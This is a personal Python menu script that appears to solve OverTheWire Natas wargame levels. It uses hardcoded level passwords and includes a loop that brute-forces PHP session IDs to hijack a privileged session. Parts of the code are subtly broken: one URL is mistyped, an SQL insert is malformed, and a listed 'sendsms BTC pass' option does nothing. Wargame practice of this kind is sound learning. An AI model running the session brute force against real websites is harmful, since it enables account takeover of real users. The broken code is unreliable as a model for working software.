import os, re, shutil , requests , sendsms , time , sqlite3
import pandas as pd
from pandas import  read_excel
import numpy as np
from bs4 import BeautifulSoup
from selenium import webdriver
import openpyxl


def display_menu():
	"""
		DISPLAY A MENU OF WHAT USER CAN DO
	"""
	print("************************************************")
	print("*****  Hello - Hessam Hosseini  ******")
	print("************************************************")
	selected = input(f"""WHICH ONE? (1-8)
	1) RUN natas2
	2) RUN natas5
	3) RUN task to do
	4) RUN tahlil_defect_op1
	5) RUN tahlil_defect
	6) RUN whatsup
	7) RUN databasetry
	8) Run natas18
	9) Run sendsms BTC pass
	PLEASE SPECIFIE WITH A NUMBER: 
	""")
	print("select Number is:",selected)
	if selected=="1":
		natas2()
	elif selected=="2":
		natas5()
		#print(op_one())
	elif selected=="3":
		pass
		
	elif selected=="4":
		pass
	elif selected=="5":
		pass
	elif selected=="6":
		pass
	elif selected=="7":
		database_try()
	elif selected=="8":
		natas18()

def natas2():
	auth = ('natas3', 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14')
	url= 'http://natas3.natas.labs.overthewire.or/s3cr3t/'
	res = requests.get(url,auth=auth)
	print(res.text)


def natas5():
	url = "http://natas5.natas.labs.overthewire.org/"
	s = requests.Session()
	s.auth = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
	r = s.get(url)
	print(r.headers)


def database_try():
	db=sqlite3.connect('test.db')
	db.execute('DROP TABLE IF EXISTS test')
	query='CREATE TABLE TEST (t1 text , i1 int)'
	query2='INSERT INTO TEST (t1,i1) VALUES (hi,3)'
	db.execute(query)
	db.commit()
	db.execute(query2)
	
	cursor=db.execute('SELECT * FROM test ORDER BY t1')
	for row in cursor:
		print(row)
	db.commit()

def natas18():
	auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
	url= 'http://natas18.natas.labs.overthewire.org//index.php'
	for i in range (1,640):
		cookies = {'PHPSESSID' : str(i)}
		res = requests.get(url,auth=auth, cookies = cookies)
		
		if 'regular user' not in res.text :
			print("the session id num is: ",i)
			print(res.text)
			break


display_menu()